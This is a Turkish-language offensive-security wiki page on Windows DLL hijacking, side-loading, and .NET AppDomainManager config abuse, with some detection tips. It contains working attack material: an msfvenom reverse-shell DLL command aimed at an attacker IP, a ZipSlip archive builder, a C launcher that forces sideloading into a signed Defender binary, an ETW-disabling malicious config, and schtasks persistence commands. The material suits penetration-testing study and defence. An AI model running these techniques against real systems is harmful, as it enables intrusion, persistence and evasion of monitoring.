# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamayı içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Başlıca kod yürütme ve kalıcılık sağlamak, daha nadiren de yetki yükseltmek için kullanılır. Burada yetki yükseltmeye odaklanılsa da hijacking yöntemi hedeflerden bağımsız olarak aynıdır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır ve her birinin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı bir DLL ile değiştirmek; isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Uygulamanın arama düzeninden yararlanarak kötü amaçlı DLL'yi meşru DLL'den önce gelen bir arama yoluna yerleştirmek.
3. **Phantom DLL Hijacking**: Uygulamanın mevcut olmadığını düşündüğü gerekli bir DLL'yi yüklemesi için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir eşdeğeriyle değiştirmek; bu yöntem genellikle DLL side-loading ile ilişkilendirilir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi kopyalanan uygulamayla birlikte kullanıcı denetimindeki bir dizine yerleştirmek; bu, Binary Proxy Execution tekniklerine benzer.

Bir uygulama **kendi DLL loader'ını** da uygulayabilir. Ayrıcalıklı bir süreç, `Libraries` veya `Plugins` gibi bir alt dizini listeleyip normal Windows DLL arama sırasından bağımsız olarak seçilen bir DLL'yi yardımcı bir programa aktarabilir. Başka bir hesap tam olarak bu dizinde dosya oluşturabiliyorsa, bunu incelenmesi gereken bir ipucu olarak değerlendirin: süreç kimliğini, dizinin etkin ACL'sini, dosya seçim kuralını ve erişilebilir bir yükleme işlemini doğrulayın. Yürütülebilir dosyanın yanındaki yazılabilir bir dizin, sürecin DLL'leri oradan yüklediğini kanıtlamaz.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Kurulum sonrası PE import grafting

Klasik side-loading, güvenilir PE'yi değiştirmeden bırakır ve DLL ad çözümlemesinden yararlanır. **Import grafting** ise güvenilir program tarafından zaten yüklenmiş bir PE'yi değiştirir. Saldırgan, saldırganın denetimindeki bir DLL için import descriptor ve ilişkili lookup/IAT girdileri ekler. Windows bu bağımlılığı özyinelemeli olarak çözümlerken eklenen DLL'yi belleğe eşler ve başlatma kodunu aksi hâlde meşru olan süreç içinde çalıştırır. Bu, diskteki bir PE'nin değiştirilmesidir; canlı bir IAT işlev işaretçisinin çalışma zamanında bir hook ile değiştirilmesiyle aynı işlem değildir.<sup>[[31]](#references)[[32]](#references)</sup>

Değiştirilen PE, kullanıcının veya Task Scheduler'ın başlattığı yürütülebilir dosya yerine bir ara satıcı DLL'si olabilir. Yeniden kullanılabilir bir zincir şöyledir:<sup>[[32]](#references)</sup>

1. Meşru yürütülebilir dosyayı ve bağımlılıklarını saldırganın denetimindeki bir dizine kopyalayın.
2. Kötü amaçlı DLL'ye başvurmaları için bağımlılıklardan birinin import yapılarını yamalayın; bağımlılığın beklenen export'larını ve normal davranışını koruyun.
3. Meşru yürütülebilir dosyayı başlatacak bir autorun veya scheduled task yapılandırın. Loader, değiştirilmiş bağımlılığı ve ardından yeni import edilen DLL'yi belleğe eşler. Görevleri listelemek için bkz. [Autoruns ile Yetki Yükseltme](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks).
4. Yoğun işlemleri `DllMain` dışında tutun; gözlemlenen loader bir worker thread oluşturup aşamalı şifre çözme işlemini burada sürdürdü.

Satıcı paketi temizse ve import değişikliği kurulumdan sonra yapılmışsa bu durum, satıcı tarafındaki bir tedarik zinciri ihlalinden farklıdır. Yalnızca host EXE'yi değil, hazırlanan dizindeki her modülü inceleyin: bağımlılıkların import listelerini ve hash'lerini temiz bir kurulumla karşılaştırın, imzaları doğrulayın ve `C:\ProgramData` gibi beklenmedik yazılabilir konumlardan başlatılan satıcı ikililerini araştırın. Böyle bir dizindeki kopyalanmış bir crash reporter veya updater'ı hedefleyen scheduled task, özellikle yararlı bir pivot noktasıdır.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + saldırgan assembly'si)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecine saldırgan kodu yükletmenin tek yolu değildir. Hedef yürütülebilir dosya **managed** bir uygulamaysa CLR, yürütülebilir dosyanın adını taşıyan bir **uygulama yapılandırma dosyasına** da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Yapılandırma, EXE'nin yanına yerleştirilmiş saldırganın denetimindeki bir assembly'yi gösteriyorsa CLR bu assembly'yi **uygulamanın normal kod yolu çalışmadan önce** yükler ve güvenilir süreç içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework yapılandırma şemasına göre özel yöneticinin kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` bulunmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

En küçük yapılandırma:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimal yönetici:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Pratik notlar:
- Bu **.NET Framework'e özgü** bir tradecraft'tir. Win32 DLL arama sırasına değil, CLR yapılandırma ayrıştırmasına dayanır.
- Host gerçekten **managed EXE** olmalıdır. Hızlı triage için: `sigcheck -m target.exe`, `corflags target.exe` kullanın veya PE metadata'sında **CLR Runtime Header** olup olmadığını kontrol edin.
- Yapılandırma dosyasının adı yürütülebilir dosyanın adıyla tam olarak eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **imzalı Microsoft/vendor binary'leriyle** kullanışlıdır; güvenilir EXE değiştirilmeden kalırken kötü amaçlı managed assembly işlem içinde çalışır.
- Zaten yazılabilir bir installer/update dizininiz varsa, AppDomainManager hijacking **ilk aşama** olarak kullanılabilir; sonraki aşamalarda klasik DLL sideloading veya reflective loading uygulanabilir.

### Downloader ve scheduled-task bootstrap olarak AppDomainManager

Pratik bir intrusion kalıbı, güvenilir managed EXE'yi hem kötü amaçlı bir `*.config` hem de yalnızca **küçük bir bootstrapper** görevi gören kötü amaçlı bir AppDomainManager DLL'iyle eşleştirmektir:<sup>[[25]](#references)</sup>

1. Kullanıcı, imzalı bir .NET installer veya updater'ı `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan başlatır.
2. Yanındaki config, meşru uygulama mantığı başlamadan **önce** CLR'nin saldırgan assembly'sini yüklemesine neden olur.
3. Kötü amaçlı manager bir **path gate** uygular (örneğin, yalnızca host EXE `Downloads` içinden çalışıyorsa devam eder ve ikinci aşamanın yalnızca `%LOCALAPPDATA%` içinden çalışmasına izin verir).
4. Kontrol başarılı olursa payload'ı `%LOCALAPPDATA%\PerfWatson2.exe` gibi kullanıcının yazabildiği bir konuma indirir ve scheduled task ile persistence kurar.

Bu varyant neden önemli:
- İmzalı host EXE değiştirilmeden kalır; bu nedenle yalnızca ana binary'nin hash'ini alan triage, ihlali gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL üçlüsünü Desktop, Temp veya bir sandbox yoluna taşımak zincirin kasıtlı olarak bozulmasına neden olabilir.
- İlk aşamadaki AppDomainManager DLL'i küçük ve düşük gürültülü kalırken gerçek implant daha sonra alınabilir.

Bu kalıpla sıkça görülen minimal persistence örneği:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notlar:
- ` /rl highest`, söz konusu kullanıcı/oturum için **kullanılabilir en yüksek** düzeyi ifade eder; tek başına SYSTEM yetkisine yükselmeyi garanti etmez.
- Bu teknik, klasik eksik-DLL arama sırası hijacking'inden ziyade **.NET config abuse yoluyla execution/persistence** olarak sınıflandırılmaya daha uygundur; ancak operatörler sıklıkla ikisini birlikte kullanır.

Tespit ipuçları:
- **ZIP'ten çıkarılmış dizinlerden**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET yürütülebilir dosyaları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içindeki bir konumu gösteren ve adları tarayıcı ya da üretici güncelleyicilerini taklit eden yeni zamanlanmış görevler.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` başlatan, kısa süre çalışan yönetilen bootstrap süreçleri.
- Yürütülebilir dosyanın yolu beklenen bir kullanıcı profili diziniyle eşleşmediğinde erken çıkan örnekler.

### Sideload zincirini yeniden başlatmak için mevcut bir zamanlanmış görevi hijack etme

Persistence için yalnızca **yeni görev oluşturulmasını** aramayın. Bazı saldırı grupları, meşru bir yükleyicinin **normal bir güncelleme görevi** oluşturmasını bekler ve ardından mevcut görev adını, yazarı ve tetikleyiciyi savunmacılara tanıdık gelecek şekilde bırakıp **görev eylemini yeniden yazar**.

Yeniden kullanılabilir iş akışı:
1. Meşru yazılımı yükleyin/çalıştırın ve normalde oluşturduğu görevi belirleyin.
2. Görev XML'ini dışa aktarın ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca eylemi değiştirerek görevin, kullanıcı tarafından yazılabilir bir hazırlık dizinindeki **güvenilir ana makine EXE'nizi** başlatmasını sağlayın. Bu EXE de gerçek payload'ı side-load veya AppDomain-load yöntemiyle yükler.
4. Belirgin yeni bir persistence izi oluşturmak yerine aynı görev adını yeniden kaydedin.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Neden daha gizlidir:
- Görev adı hâlâ meşru görünebilir (örneğin bir üretici güncelleyicisi).
- Görevi **Task Scheduler service** başlattığından, üst/ata süreç doğrulaması çoğu zaman `explorer.exe` yerine beklenen zamanlama zincirini görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı zaten var olan ancak eylemi artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın denetimindeki başka bir yolu gösteren bir görevi gözden kaçırabilir.

Hızlı avlanma noktaları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML dosyalarını ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` meta verilerini bir temel değerle karşılaştırın.
- **Üretici güncelleyicisine benzeyen bir görev** **kullanıcının yazabildiği dizinlerden** çalıştırıldığında veya yanında `*.config` dosyası bulunan bir .NET EXE başlattığında uyarı oluşturun.

> [!TIP]
> HTML hazırlama, AES-CTR yapılandırmaları ve .NET implantlarını DLL sideloading üzerine katmanlayan adım adım bir zincir için aşağıdaki iş akışına bakın.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Side-loaded stage'i service komut satırına bağlama

Side-loaded bir DLL, beklenen ana EXE ve DLL adından fazlasını gerektirebilir. Mandiant, payload şifre çözme işlemini bir komut satırı argümanına ve ana yürütülebilir dosyanın adına bağlayan bir loader tanımladı.<sup>[[33]](#references)</sup> Daha sonraki bir service tabanlı zincirde, kopyalanmış meşru bir ana dosya, `LockClrVersion` dışa aktaran komşu bir `mscoree.dll` yükledi ve gömülü aşamasının şifresini ancak service argümanından ve ana yürütülebilir dosyanın temel adından AES-128 anahtarı türettikten sonra çözdü. Her girdi 16 bayta kısaltıldı veya NUL ile dolduruldu; bayt düzeyindeki anahtar `argument XOR embedded_key XOR executable_basename` olarak oluşturuldu, ardından payload AES-CBC ile dolgu kullanmadan çözüldü. Ana dosyanın adını değiştirmek veya beklenen argüman olmadan başlatmak, DLL yüklenmeye devam etse bile anahtarı değiştirir ve bu aşamanın şifresinin çözülmesini engeller. Bu varyantı yeniden üretirken veya analiz ederken tam komut satırı argümanını ve temel adı koruyun.<sup>[[34]](#references)</sup>

Bu, **sıradan DLL side-loading üzerine eklenen bir payload kapısıdır**; yeni bir DLL arama sırası kuralı veya tek başına bir ayrıcalık yükseltme yöntemi değildir. Sonuçta elde edilen ayrıcalık düzeyini service'in güvenlik bağlamı belirler. [GitHub issue/file C2 iş akışı](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) sonraki aktarımı ayrıca belgeler.<sup>[[34]](#references)</sup>

## Eksik DLL'leri bulma

Bir sistemde eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aracını çalıştırıp **aşağıdaki 2 filtreyi ayarlamaktır**:

![Common Techniques - Eksik DLL'leri bulma: Bir sistemde eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın procmon aracını çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Eksik DLL'leri bulma: Bir sistemde eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın procmon aracını çalıştırıp aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity** etkinliklerini gösterin:

![Common Techniques - Eksik DLL'leri bulma: yalnızca File System Activity etkinliklerini gösterin](<../../../images/image (153).png>)

**Genel olarak eksik DLL'leri** arıyorsanız, bunu **birkaç saniye** çalışır durumda **bırakın**.\
**Belirli bir yürütülebilir dosyada eksik olan DLL'yi** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, dosyayı çalıştırın ve olay yakalamayı durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'leri istismar etme

Ayrıcalıkları yükseltmek için, ayrıcalıklı bir sürecin yazabileceğiniz bir konumdan yüklemeye çalıştığı bir **DLL** arayın. Bu, meşru DLL'nin bulunduğu dizinden önce aranan bir dizini denetlediğinizde veya istenen DLL bulunmadığında ve aranan dizinlerden birine yazabildiğinizde gerçekleşebilir.

### DLL arama sırası

DLL'lerin nasıl yüklendiğine ilişkin ayrıntıları **[Microsoft belgelerinde](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) bulabilirsiniz.**

**Windows uygulamaları**, DLL'leri **önceden tanımlanmış arama yollarını** belirli bir sırayla izleyerek arar. DLL hijacking sorunu, zararlı bir DLL'nin bu dizinlerden birine stratejik olarak yerleştirilmesiyle ortaya çıkar; böylece meşru DLL'den önce yüklenir. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.

Aşağıda **32-bit** sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir işlev yoktur, ancak bu dizin yine de aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın.
   1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt defteri anahtarında belirtilen uygulama başına yolu içermediğini unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **varsayılan** arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturup 0 olarak ayarlayın (varsayılan olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün bulunduğu dizinden başlar.

Son olarak, DLL ad yerine mutlak yol kullanılarak yüklenebilir. Bu durumda Windows, DLL'nin kendisi için yalnızca belirtilen yola bakar; adla istenen bağımlılıklar yine geçerli arama sırasını izler.

Arama sırasını değiştirmenin başka yolları da var, ancak bunları burada açıklamayacağım.

### İsteğe bağlı dosya yazma işlemini eksik-DLL hijack zincirine bağlama

**İlgili teknik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Sürecin bulamadığı DLL adlarını toplamak için **ProcMon** filtrelerini (`Process Name` = hedef EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. İkili dosya bir **zamanlamayla/service** üzerinden çalışıyorsa, bu adlardan birine sahip DLL'yi **uygulama dizinine** (arama sırasındaki 1. giriş) bırakın; DLL bir sonraki çalıştırmada yüklenir. Bir .NET tarayıcı örneğinde süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` dosyasını arıyordu.
3. Bir payload DLL'si (ör. reverse shell) oluşturmak için dışa aktarılan herhangi bir öğeyi kullanın: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip tarzı rastgele yazma** ise, DLL'nin uygulama klasörüne düşmesini sağlayacak şekilde çıkarma dizininin dışına çıkan bir ZIP girdisi oluşturun:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Arşivi izlenen gelen kutusuna/paylaşıma teslim edin; zamanlanmış görev süreci yeniden başlattığında, kötü amaçlı DLL yüklenir ve kodunuzu hizmet hesabı olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden sideloading'i zorlama

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in yerel API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırganın kontrolündeki bir dizini sağlayarak, içe aktarılan bir DLL’yi adıyla çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef sürecin bu dizindeki kötü amaçlı DLL’yi yüklemesini sağlayabilirsiniz.

Temel fikir
- RtlCreateProcessParametersEx ile süreç parametrelerini oluşturun ve denetiminizdeki klasörü (ör. dropper/unpacker’ınızın bulunduğu dizini) gösteren özel bir DllPath sağlayın.
- RtlCreateUserProcess ile süreci oluşturun. Hedef ikili dosya bir DLL’yi adıyla çözdüğünde, yükleyici çözümleme sırasında sağlanan DllPath’e başvurur; böylece kötü amaçlı DLL hedef EXE ile aynı dizinde olmasa bile güvenilir biçimde sideloading yapılabilir.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; yalnızca geçerli süreci etkileyen SetDllDirectory’den farklıdır.
- Hedef, bir DLL’yi adıyla içe aktarmalı veya LoadLibrary ile yüklemelidir (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve sabit kodlanmış mutlak yollar ele geçirilemez. Forwarded export’lar ve SxS önceliği değiştirebilir.

En basit C örneği (ntdll, geniş dizeler, basitleştirilmiş hata işleme):

<details>
<summary>Eksiksiz C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden DLL sideloading'i zorlama</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasyonel kullanım örneği
- Gerekli işlevleri dışa aktaran veya gerçek DLL'e proxy işlemi yapan kötü amaçlı bir xmllite.dll dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen, imzalı bir binary başlatın. Loader, import'u sağlanan DllPath üzerinden çözümler ve DLL'inizi sideload eder.

Bu tekniğin gerçek saldırılarda çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: İlk launcher bir yardımcı DLL bırakır; bu DLL de özel bir DllPath ile Microsoft tarafından imzalanmış, hijack edilebilir bir binary başlatarak saldırganın DLL'inin bir hazırlık dizininden yüklenmesini sağlar.<sup>[[6]](#references)</sup>


### `.exe.config` üzerinden .NET AppDomainManager hijacking

**.NET Framework** hedeflerinde, uygulamanın yanındaki **`.exe.config`** dosyasını kötüye kullanarak belleğe patch uygulamadan **`Main()` öncesinde** sideloading yapılabilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine, meşru bir .NET EXE dosyasını kötü amaçlı bir config dosyasının ve saldırganın kontrolündeki bir veya daha fazla assembly'nin yanına yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE başlatılır ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, runtime'ın saldırganın kontrolündeki bir `AppDomainManager` örneği oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir host process içinde **`Main()` öncesinde kod çalıştırır**.
4. Aynı config, CLR'yi önce yerel assembly'leri (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) çözümlemeye zorlayabilir ve inline patch uygulamadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Kampanya tarzı örüntü (iç içe yerleşim, direktife/CLR sürümüne göre değişebilir):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Neden kullanışlı:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, CLR başlatılırken, meşru uygulama mantığı çalışmadan önce yürütmeyi saldırgan koduna taşır.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name doğrulama hatası olmadan imzasız veya değiştirilmiş assembly'leri yüklemesini sağlayabilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmelerinin daha yeni assembly'lere gitmesini önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha öngörülebilir hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle ilgi çekicidir; çünkü implantın bellekte `EtwEventWrite`'ı yamaması yerine **CLR kendi ETW görünürlüğünü** yapılandırma üzerinden devre dışı bırakır.

Son kampanyalarda görülen operasyonel model:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly'leri bırakır.
- Aşama 2, bunları inandırıcı görünen bir **AppData update** klasörüne kopyalar, ana dosyanın adını `update.exe` gibi bir şeyle değiştirir ve **scheduled task** aracılığıyla yeniden başlatır.
- Aşama 3, son RAT DLL/export'unu yüklemeden önce yürütme bağlamını (örneğin, Task Scheduler'dan gelen beklenen üst işlem `svchost.exe`) doğrular.

Avlanma fikirleri:
- Kullanıcının yazabildiği konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan imzalı veya başka şekilde meşru **.NET yürütülebilir dosyaları**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- Yeniden adlandırılmış update ikili dosyalarını **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerinden yeniden başlatan scheduled task'ler.
- Bir scheduled task'in güvenilir bir .NET ana makinesini başlatıp bu ana makinenin hemen kendi dizininden satıcıya ait olmayan assembly'leri yüklediği üst/alt işlem zincirleri.

#### Windows belgelerinde DLL arama sırasına ilişkin istisnalar

Windows belgelerinde standart DLL arama sırasına ilişkin bazı istisnalardan söz edilir:

- Belleğe önceden yüklenmiş bir DLL ile aynı ada sahip bir **DLL** ile karşılaşıldığında sistem olağan aramayı atlar. Bunun yerine, varsayılan olarak bellekteki DLL'yi kullanmadan önce yönlendirme ve manifest denetimi yapar. **Bu durumda sistem DLL'yi aramaz**.
- DLL, geçerli Windows sürümü için bir **known DLL** olarak tanınırsa sistem, arama sürecini **atlayarak** bilinen DLL'nin kendi sürümünü ve bağımlı DLL'lerini kullanır. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarı bu known DLL'lerin listesini tutar.
- Bir **DLL'nin bağımlılıkları** varsa, bu bağımlı DLL'ler ilk DLL tam yol üzerinden bulunmuş olsa bile yalnızca **modül adlarıyla** belirtilmiş gibi aranır.

### Yetki Yükseltme

**Gereksinimler**:

- **Farklı yetkilerle** (yatay veya yanal hareket) çalışan ya da çalışacak ve **bir DLL'si eksik** olan bir işlem belirleyin.
- **DLL'nin** aranacağı herhangi bir **dizine** yazma erişiminiz olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

